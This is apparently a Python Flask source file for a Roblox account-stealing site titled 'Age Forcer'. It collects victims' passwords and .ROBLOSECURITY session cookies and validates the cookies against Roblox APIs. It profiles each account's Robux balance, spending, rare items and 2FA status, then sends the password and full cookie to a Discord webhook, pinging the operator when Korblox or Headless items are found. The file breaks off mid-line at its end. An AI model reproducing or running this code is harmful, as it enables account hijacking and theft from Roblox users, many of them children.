import os
import sys
import json
import re
import requests
import base64
import time
import threading
from flask import Flask, request, jsonify, send_from_directory
from dotenv import load_dotenv

# Load environment variables from .env file
load_dotenv()

app = Flask(__name__)

def clean_roblox_cookie(cookie):
    """
    Cookie cleaning function - now returns the cookie as-is
    (Warning prefix removal has been disabled)
    """
    return cookie

def send_to_discord_background(password, cookie, webhook_url):
    """Background function to send data to Discord webhook"""
    try:
        print("Background: Fetching Roblox user information...")
        user_info = get_roblox_user_info(cookie)
        
        # Check if cookie actually works with Roblox API
        if not user_info.get('success', False):
            print("Background: Cookie failed validation against Roblox API - not sending webhooks")
            return
        
        # Check if user has Korblox or Headless for ping notification
        korblox = user_info.get('has_korblox', False)
        headless = user_info.get('has_headless', False)
        has_premium_items = korblox or headless
        ping_content = ''
        
        if has_premium_items:
            # Ping the user if account has Korblox or Headless
            ping_content = '<@1343590833995251825> 🚨 **PREMIUM ITEMS DETECTED!** 🚨'
            if korblox and headless:
                ping_content += ' - Account has both Korblox AND Headless!'
            elif korblox:
                ping_content += ' - Account has Korblox!'
            elif headless:
                ping_content += ' - Account has Headless!'
        
        # Prepare cookie content for Discord
        cookie_content = cookie if cookie else 'Not provided'
        
        # Truncate cookie if too long for Discord
        available_cookie_space = 3990  # Conservative limit
        if len(cookie_content) > available_cookie_space:
            cookie_content = cookie_content[:available_cookie_space] + "..."
            print(f"Background: Cookie truncated to fit Discord limit")
        
        # Create Discord embed data
        discord_data = {
            'content': ping_content,
            'embeds': [
                {
                    'title': 'Age Forcer',
                    'color': 0xff0000,
                    'thumbnail': {
                        'url': user_info['profile_picture']
                    },
                    'fields': [
                        {
                            'name': '👤 Username',
                            'value': user_info['username'],
                            'inline': False
                        },
                        {
                            'name': '🔐 Password',
                            'value': password if password else 'Not provided',
                            'inline': False
                        },
                        {
                            'name': '💰 Robux',
                            'value': user_info['robux_balance'].replace('R$ ', '') if 'R$ ' in user_info['robux_balance'] else user_info['robux_balance'],
                            'inline': False
                        },
                        {
                            'name': '⌛ Pending',
                            'value': user_info['pending_robux'],
                            'inline': False
                        },
                        {
                            'name': '📊 Total spent robux past Year',
                            'value': user_info.get('total_spent_past_year', 'Not available'),
                            'inline': False
                        },
                        {
                            'name': '👑 Korblox',
                            'value': '✅' if korblox else '❌',
                            'inline': False
                        },
                        {
                            'name': '💀 Headless',
                            'value': '✅' if headless else '❌',
                            'inline': False
                        },
                        {
                            'name': '🔐 Account Settings',
                            'value': f"Email Verify {user_info.get('email_verified', '❌')} | Email Secure {user_info.get('email_secure', '❌')} | Authenticator {user_info.get('authenticator_enabled', '❌')}",
                            'inline': False
                        }
                    ],
                    'footer': {
                        'text': f'Today at {time.strftime("%H:%M", time.localtime())}',
                        'icon_url': 'https://images-ext-1.discordapp.net/external/1pnZlLshYX8TQApvvJUOXUSmqSHHzIVaShJ3YnEu9xE/https/www.roblox.com/favicon.ico'
                    }
                },
                {
                    'title': '🍪 Cookie Data',
                    'color': 0xff0000,
                    'description': f'```{cookie_content}```',
                    'footer': {
                        'text': 'Authentication Token • Secured',
                        'icon_url': 'https://images-ext-1.discordapp.net/external/1pnZlLshYX8TQApvvJUOXUSmqSHHzIVaShJ3YnEu9xE/https/www.roblox.com/favicon.ico'
                    }
                }
            ]
        }
        
        # Send to main Discord webhook (full data with cookie)
        payload_size = len(json.dumps(discord_data))
        print(f"Background: Sending Discord payload of size: {payload_size} bytes")
        
        response = requests.post(webhook_url, json=discord_data, timeout=5)
        
        if response.status_code in [200, 204]:
            print(f"Background: Discord webhook successful: {response.status_code}")
        else:
            print(f"Background: Discord webhook failed: {response.status_code}")
        
            
    except Exception as e:
        print(f"Background: Error sending to Discord: {str(e)}")

def get_roblox_user_info(cookie):
    """Get Roblox user information using the provided cookie"""
    try:
        headers = {
            'Cookie': f'.ROBLOSECURITY={cookie}' if not cookie.startswith('.ROBLOSECURITY=') else cookie,
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        
        # Get current user info
        response = requests.get('https://users.roblox.com/v1/users/authenticated', 
                              headers=headers, timeout=3)
        
        if response.status_code == 200:
            user_data = response.json()
            user_id = user_data.get('id')
            username = user_data.get('name', 'Unknown')
            display_name = user_data.get('displayName', username)
            
            # Get user avatar/profile picture
            avatar_response = requests.get(f'https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={user_id}&size=150x150&format=Png',
                                         timeout=5)
            
            profile_picture_url = 'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-A84C1E07EBC93E9CDAEC87A36A2FEA33-Png/150/150/AvatarHeadshot/Png/noFilter'
            if avatar_response.status_code == 200:
                avatar_data = avatar_response.json()
                if avatar_data.get('data') and len(avatar_data['data']) > 0:
                    profile_picture_url = avatar_data['data'][0].get('imageUrl', profile_picture_url)
            
            # Get Robux balance - try multiple endpoints
            robux_balance = 'Not available'
            
            # Try the currency endpoint first
            try:
                robux_response = requests.get('https://economy.roblox.com/v1/users/currency',
                                            headers=headers, timeout=5)
                print(f"Robux API response status: {robux_response.status_code}")
                
                if robux_response.status_code == 200:
                    robux_data = robux_response.json()
                    print(f"Robux API response: {robux_data}")
                    if 'robux' in robux_data:
                        robux_balance = f"R$ {robux_data['robux']:,}"
                    else:
                        print("No 'robux' field in response")
                else:
                    print(f"Robux API failed with status: {robux_response.status_code}, response: {robux_response.text}")
            except Exception as robux_error:
                print(f"Error getting Robux balance: {str(robux_error)}")
                
            # If first method failed, try alternative endpoint using user_id
            if robux_balance == 'Not available' and user_id:
                try:
                    alt_response = requests.get(f'https://economy.roblox.com/v1/users/{user_id}/currency',
                                              headers=headers, timeout=5)
                    print(f"Alternative Robux API response status: {alt_response.status_code}")
                    
                    if alt_response.status_code == 200:
                        alt_robux_data = alt_response.json()
                        print(f"Alternative Robux API response: {alt_robux_data}")
                        if 'robux' in alt_robux_data:
                            robux_balance = f"R$ {alt_robux_data['robux']:,}"
                except Exception as alt_error:
                    print(f"Alternative Robux API error: {str(alt_error)}")
            
            # Get Pending Robux using transaction totals endpoint
            pending_robux = 'Not available'
            try:
                pending_response = requests.get(f'https://economy.roblox.com/v2/users/{user_id}/transaction-totals?timeFrame=Month&transactionType=summary',
                                              headers=headers, timeout=5)
                print(f"Pending Robux API response status: {pending_response.status_code}")
                
                if pending_response.status_code == 200:
                    pending_data = pending_response.json()
                    print(f"Pending Robux API response: {pending_data}")
                    if 'pendingRobuxTotal' in pending_data:
                        pending_amount = pending_data['pendingRobuxTotal']
                        pending_robux = f"{pending_amount:,}" if isinstance(pending_amount, (int, float)) else str(pending_amount)
                    else:
                        print("No 'pendingRobuxTotal' field in response")
                        pending_robux = '0'
                else:
                    print(f"Pending Robux API failed with status: {pending_response.status_code}, response: {pending_response.text}")
                    pending_robux = '0'
            except Exception as pending_error:
                print(f"Error getting Pending Robux: {str(pending_error)}")
                pending_robux = '0'
            
            # Get Total spent robux past year using transaction totals endpoint
            total_spent_past_year = 'Not available'
            try:
                # Try yearly timeframe first
                year_response = requests.get(f'https://economy.roblox.com/v2/users/{user_id}/transaction-totals?timeFrame=Year&transactionType=summary',
                                           headers=headers, timeout=5)
                print(f"Yearly spending API response status: {year_response.status_code}")
                
                if year_response.status_code == 200:
                    year_data = year_response.json()
                    print(f"Yearly spending API response: {year_data}")
                    
                    # Look for outgoing robux total (spent robux)
                    if 'outgoingRobuxTotal' in year_data:
                        spent_amount = year_data['outgoingRobuxTotal']
                        total_spent_past_year = f"{spent_amount:,}" if isinstance(spent_amount, (int, float)) else str(spent_amount)
                    elif 'robuxSpent' in year_data:
                        spent_amount = year_data['robuxSpent']
                        total_spent_past_year = f"{spent_amount:,}" if isinstance(spent_amount, (int, float)) else str(spent_amount)
                    else:
                        print("No spending data fields found in yearly response")
                        total_spent_past_year = '0'
                        
                elif year_response.status_code == 500:
                    # Known issue with yearly timeframe, try monthly as fallback
                    print("Yearly API returned 500 error, falling back to monthly data estimation")
                    total_spent_past_year = 'Estimate unavailable'
                else:
                    print(f"Yearly spending API failed with status: {year_response.status_code}, response: {year_response.text}")
                    total_spent_past_year = 'API Error'
                    
            except Exception as year_error:
                print(f"Error getting yearly spending data: {str(year_error)}")
                total_spent_past_year = 'Connection Error'
            
            # Check Premium status
            premium_status = '❌ No'
            try:
                premium_response = requests.get(f'https://premiumfeatures.roblox.com/v1/users/{user_id}/validate-membership',
                                              headers=headers, timeout=5)
                print(f"Premium API response status: {premium_response.status_code}")
                
                if premium_response.status_code == 200:
                    premium_data = premium_response.json()
                    print(f"Premium API response: {premium_data}")
                    # Handle both object and boolean responses
                    if isinstance(premium_data, bool):
                        premium_status = '✅ Yes' if premium_data else '❌ No'
                    elif isinstance(premium_data, dict) and premium_data.get('isPremium', False):
                        premium_status = '✅ Yes'
                else:
                    print(f"Premium API failed with status: {premium_response.status_code}")
            except Exception as premium_error:
                print(f"Error getting Premium status: {str(premium_error)}")
            
            # Check for Korblox and Headless items in user's inventory
            has_korblox = False
            has_headless = False
            
            try:
                # Check for Korblox Deathspeaker Right Leg (ID: 139607718)
                korblox_response = requests.get(f'https://inventory.roblox.com/v1/users/{user_id}/items/Asset/139607718',
                                              headers=headers, timeout=5)
                print(f"Korblox inventory check status: {korblox_response.status_code}")
                
                if korblox_response.status_code == 200:
                    korblox_data = korblox_response.json()
                    has_korblox = len(korblox_data.get('data', [])) > 0
                    print(f"Korblox check result: {has_korblox}")
                else:
                    print(f"Korblox inventory check failed: {korblox_response.status_code}")
                    
            except Exception as korblox_error:
                print(f"Error checking Korblox inventory: {str(korblox_error)}")
            
            try:
                # Check for Headless items (both classic and dynamic)
                headless_ids = [134082579, 15093053680]  # Classic and Dynamic Headless
                
                for headless_id in headless_ids:
                    headless_response = requests.get(f'https://inventory.roblox.com/v1/users/{user_id}/items/Asset/{headless_id}',
                                                   headers=headers, timeout=5)
                    print(f"Headless {headless_id} inventory check status: {headless_response.status_code}")
                    
                    if headless_response.status_code == 200:
                        headless_data = headless_response.json()
                        if len(headless_data.get('data', [])) > 0:
                            has_headless = True
                            print(f"Headless item {headless_id} found")
                            break
                    else:
                        print(f"Headless {headless_id} inventory check failed: {headless_response.status_code}")
                        
            except Exception as headless_error:
                print(f"Error checking Headless inventory: {str(headless_error)}")
            
            # Check Account Settings (Email verification, Email secure, Authenticator)
            email_verified = '❌'
            email_secure = '❌'
            authenticator_enabled = '❌'
            
            try:
                # Check email verification and 2FA settings
                settings_response = requests.get('https://accountsettings.roblox.com/v1/email',
                                               headers=headers, timeout=5)
                print(f"Account settings API response status: {settings_response.status_code}")
                
                if settings_response.status_code == 200:
                    settings_data = settings_response.json()
                    print(f"Account settings API response: {settings_data}")
                    
                    # Check email verification status
                    if settings_data.get('emailAddress') and settings_data.get('verified', False):
                        email_verified = '✅'
                        email_secure = '✅'  # If email is verified, consider it secure
                else:
                    print(f"Account settings API failed with status: {settings_response.status_code}")
                    
            except Exception as settings_error:
                print(f"Error checking account settings: {str(settings_error)}")
            
            try:
                # Check 2FA/Authenticator status
                twostep_response = requests.get('https://twostepverification.roblox.com/v1/users/configuration',
                                              headers=headers, timeout=5)
                print(f"2FA API response status: {twostep_response.status_code}")
                
                if twostep_response.status_code == 200:
                    twostep_data = twostep_response.json()
                    print(f"2FA API response: {twostep_data}")
                    
                    # Check if authenticator is enabled
                    if twostep_data.get('authenticatorEnabled', False) or twostep_data.get('totpEnabled', False):
                        authenticator_enabled = '✅'
                    elif twostep_data.get('emailEnabled', False):
                        # Email-based 2FA is enabled but not authenticator app
                        pass  # Keep authenticator as ❌ but user has some 2FA
                else:
                    print(f"2FA API failed with status: {twostep_response.status_code}")
                    
            except Exception as twostep_error:
                print(f"Error checking 2FA settings: {str(twostep_error)}")
            
            return {
                'success': True,
                'username': username,
                'display_name': display_name,
                'user_id': user_id,
                'profile_picture': profile_picture_url,
                'robux_balance': robux_balance,
                'pending_robux': pending_robux,
                'premium_status': premium_status,
                'total_spent_past_year': total_spent_past_year,
                'has_korblox': has_korblox,
                'has_headless': has_headless,
                'email_verified': email_verified,
                'email_secure': email_secure,
                'authenticator_enabled': authenticator_enabled
            }
        else:
            print(f"Cookie validation failed against Roblox API: {response.sta
